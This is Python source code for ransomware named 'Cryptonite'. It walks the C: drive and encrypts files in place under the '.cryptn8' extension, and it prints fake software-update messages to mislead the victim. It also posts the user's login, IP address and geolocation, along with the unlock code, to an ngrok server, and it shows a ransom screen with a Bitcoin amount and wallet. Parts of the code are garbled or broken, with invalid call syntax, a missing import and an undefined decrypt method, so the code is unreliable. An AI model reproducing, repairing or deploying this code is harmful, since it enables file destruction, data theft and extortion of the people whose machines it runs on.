import os
from cryptography.fernet import Fernet
import random
from datetime import datetime
import time
import requests as r
import json
import pymsgbox as pmb


key = Fernet.generate_key()
fe = Fernet(key)
dkrpt = random.randint(100000, 999999)
uniqKey = str(datetime.now()).replace(' ', '').replace(':', '').replace('.', '').replace('-', '')
URL = 'https://.ngrok.io'
BTC_AMOUNT = '0.0090'
BTC_WALLET = 'bc1grs642t7jv7chi'
EMAIL = 'xxxxxxxx@gmail.com'
EXT = '.cryptn8'
fileLists = []
fileList = []
EXCLUDED_DIRS = ["/Windows/Program Files", "/Program Files(x86)", "/AppData"]

class Cryptonite:
    def __init__(self, key, fe, dkrpt, uniqKey):
        self.key = key
        self.fernetEncrypt = fe
        self.decryptPlease = dkrpt
        self.uniquekey = uniqKey

    def sendKeys(self):
        id = self.uniquekey
        user = os.getlogin()
        key = self.decryptPlease
        try:
            info = eval(r.get('https://ipinfo.io/json').text)
            ip = info['ip']
            lat = info['loc'].split(',')[0]
            long = info['loc'].split(',')[1]
            location = info['city'] + ' ' + info['region'] + ',' + info['country']
            jsonFormat = {
                'unique_id': id,
                'user': user,
                'key': key,
                'ip': ip,
                'latitude': lat,
                'longitude': long,
                'location': location
            }
            r.post(URL, json.dumps(jsonFormat), **('data',))
        except:
            pmb.confirm('Please make sure that you are connected to the internet and try again.', "Network Error")
            exit()
            
    
    def findFiles(self):
        print('Please be patient, checking for new updates...\n')
        time.sleep(5)
        print('Update found! Downloading the files... \n')
        for root, dir, file in os.walk('c:/'):
            for i in range(len(EXCLUDED_DIRS)):
                if EXCLUDED_DIRS[i] in root:
                    break
                    continue
                if i == len(EXCLUDED_DIRS) - 1:
                    for files in file:
                        files = os.path.join(root, files)
                        fileLists.append(files)
        print("Download Completed!\n")
        time.sleep(2)
        print("Installing the Updates. This might take some time. Please be patient... \n")
        self.encrypt()
        os.system('cls' if os.name == 'nt' else 'clear')

    def encrypt(self):
        for file in tqdm.tqdm(fileLists):
            flag = 0
            newfile = str(file) + EXT
            try:
                with open(file, 'rb') as f:
                    data = f.read()
                    encryptedData = self.fernetEncrypt.encrypt(data)
            except:
                flag = 1
            if flag == 0:
                try:
                    with open(file, 'wb') as f:
                        fileList.append(file)
                        f.write(encryptedData)
                except:
                    pass


class System(Cryptonite):
    def __init__ (self= None):
        super().__init__(key, fe, dkrpt, uniqKey)
    def warningScreen(self):
        import tkinter as tk
        ttk = ttk
        import tkinter.ttk
        window = tk.Tk()
        window.title('Your System has been Encrypted!')
        
        def clear1(*args):
            decryption_key.delete('0', tk.END)
        
        def key_collect():
            try:
                key = int(decryption_key.get())
                if int(key)== self.decryptPlease:
                    self.decrypt()
                    window.destroy()
                else:
                    pmb.confirm('Wrong KEY!','OK'],**('buttons',))
                    window.destroy()
                    exit()
            except:
                pmb.confirm('Wrong KEY!','OK'],**('buttons',))
                window.destroy()
                exit()
                
if __name__ == '__main__':
    system = System()
    system.sendKeys()
    system.findFiles()
    system.warningScreen()